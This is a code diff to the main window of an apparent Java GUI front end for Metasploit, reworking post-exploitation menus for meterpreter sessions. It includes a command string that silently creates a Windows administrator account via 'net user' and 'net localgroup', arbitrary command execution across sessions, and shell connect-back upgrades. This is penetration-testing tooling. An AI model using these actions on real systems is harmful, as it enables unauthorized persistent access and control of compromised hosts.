@@ -395,7 +395,6 @@ public class MainFrame extends FrameView {
 			}
 		};
 	}
-	
 
 	/** This method is called from within the constructor to
 	 * initialize the form.
@@ -529,7 +528,6 @@ public class MainFrame extends FrameView {
         clearHistoryItem = new javax.swing.JMenuItem();
         postMenu = new javax.swing.JMenu();
         menuRunAllMeterp = new javax.swing.JMenu();
-        otherMeterpCommandMenu = new javax.swing.JMenuItem();
         killSessionsMenuItem = new javax.swing.JMenuItem();
         collectedCredsMenuItem = new javax.swing.JMenuItem();
         logGenerateMenuItem = new javax.swing.JMenuItem();
@@ -831,23 +829,12 @@ public class MainFrame extends FrameView {
 
         postMenu.setMnemonic('t');
         postMenu.setText(resourceMap.getString("postMenu.text")); // NOI18N
-        postMenu.setName("postMenu"); // NOI18N
         postMenu.setEnabled(false);
+        postMenu.setName("postMenu"); // NOI18N
 
         menuRunAllMeterp.setMnemonic('R');
         menuRunAllMeterp.setText(resourceMap.getString("menuRunAllMeterp.text")); // NOI18N
         menuRunAllMeterp.setName("menuRunAllMeterp"); // NOI18N
-
-        otherMeterpCommandMenu.setMnemonic('O');
-        otherMeterpCommandMenu.setText(resourceMap.getString("otherMeterpCommandMenu.text")); // NOI18N
-        otherMeterpCommandMenu.setName("otherMeterpCommandMenu"); // NOI18N
-        otherMeterpCommandMenu.addActionListener(new java.awt.event.ActionListener() {
-            public void actionPerformed(java.awt.event.ActionEvent evt) {
-                otherMeterpCommandMenuActionPerformed(evt);
-            }
-        });
-        menuRunAllMeterp.add(otherMeterpCommandMenu);
-
         postMenu.add(menuRunAllMeterp);
 
         killSessionsMenuItem.setMnemonic('K');
@@ -1159,14 +1146,6 @@ public class MainFrame extends FrameView {
 			JOptionPane.showMessageDialog(this.getFrame(), "Can't find the URL. This really should never happen. Report this bug.");
 		}
 	}//GEN-LAST:event_onlineHelpMenuActionPerformed
-
-	private void otherMeterpCommandMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_otherMeterpCommandMenuActionPerformed
-		final String command = JOptionPane.showInputDialog(this.getFrame(),
-				"Enter a command","Run command on all meterpreter sessions", JOptionPane.QUESTION_MESSAGE);
-		if(command == null)
-			return;
-		runOnAllMeterpreters(command,command,statusMessageLabel);
-	}//GEN-LAST:event_otherMeterpCommandMenuActionPerformed
 
 	private void logGenerateMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_logGenerateMenuItemActionPerformed
 		try{
@@ -1523,10 +1502,12 @@ public class MainFrame extends FrameView {
 		shellPopupMenu = new JPopupMenu();
 		addSessionItem("Interact",shellPopupMenu,null);
 		addSessionItem("Upgrade",shellPopupMenu,new RpcAction(this) {
+			String[] vals = null;
 			public void action(Map session) throws Exception {
-				String[] res = JOptionPane.showInputDialog(getFrame(), "Select host/port for connect back.",
-						session.get("tunnel_local").toString().split(":")[0]+":4444").split(":");
-				rpcConn.execute("session.shell_upgrade", session.get("id"), res[0], res[1]);
+				if(vals == null)
+					vals = JOptionPane.showInputDialog(getFrame(), "Select host/port for connect back.",
+							session.get("tunnel_local").toString().split(":")[0]+":4444").split(":");
+				rpcConn.execute("session.shell_upgrade", session.get("id"), vals[0], vals[1]);
 			}
 		});
 		addSessionKillItem(shellPopupMenu);
@@ -1592,11 +1573,11 @@ public class MainFrame extends FrameView {
 				return "gettelnet.rb "+UserPassDialog.getUserPassOpts(getFrame());
 			}
 		});
-		addScript("Add admin user",accessMenu,new RpcAction(this) {
+		addSessionItem("Add admin user",accessMenu,new RpcAction(this) {
+			String[] userPass = null;
 			public void action(Map session) throws Exception {
-				String[] userPass = UserPassDialog.showUserPassDialog(getFrame());
 				if(userPass == null)
-					return;
+					userPass = UserPassDialog.showUserPassDialog(getFrame());
 				rpcConn.execute("session.meterpreter_write", session.get("id"),Base64.encode(
 						("execute -H -f cmd -a \"/c net user "+userPass[0]+" "+userPass[1]+" /ADD " +
 						"&& net localgroup Administrators "+userPass[0]+" /ADD\" \n").getBytes()));
@@ -1626,6 +1607,16 @@ public class MainFrame extends FrameView {
 		addSessionItem("winenum: env vars, interfaces, routing, users, processes, tokens...",infoPopupMenu,"winenum");
 		addSessionItem("Remote winenum: most of the above run against a different system",infoPopupMenu,
 				new RemoteWinenumOptionsDialog(getFrame()));
+
+		addSessionItem("Other",meterpreterPopupMenu,new RpcAction(this) {
+			String command = null;
+			public void action(Map session) throws Exception {
+				if(command == null)
+					command = JOptionPane.showInputDialog(getFrame(),
+							"Enter a command","Run command on selected meterpreter sessions", JOptionPane.QUESTION_MESSAGE);
+				rpcConn.execute("session.meterpreter_write", session.get("id"),Base64.encode(command.getBytes()));
+			}
+		});
 		addSessionKillItem(meterpreterPopupMenu);
 		
 		//Setup generic menu (for vnc or whatever other sessions)
@@ -1709,7 +1700,6 @@ public class MainFrame extends FrameView {
     private javax.swing.JScrollPane notesPane;
     private javax.swing.JTable notesTable;
     private javax.swing.JMenuItem onlineHelpMenu;
-    private javax.swing.JMenuItem otherMeterpCommandMenu;
     private javax.swing.JMenuItem otherPluginItem;
     private javax.swing.JMenu payloadsMenu;
     private javax.swing.JMenu pluginsMenu;
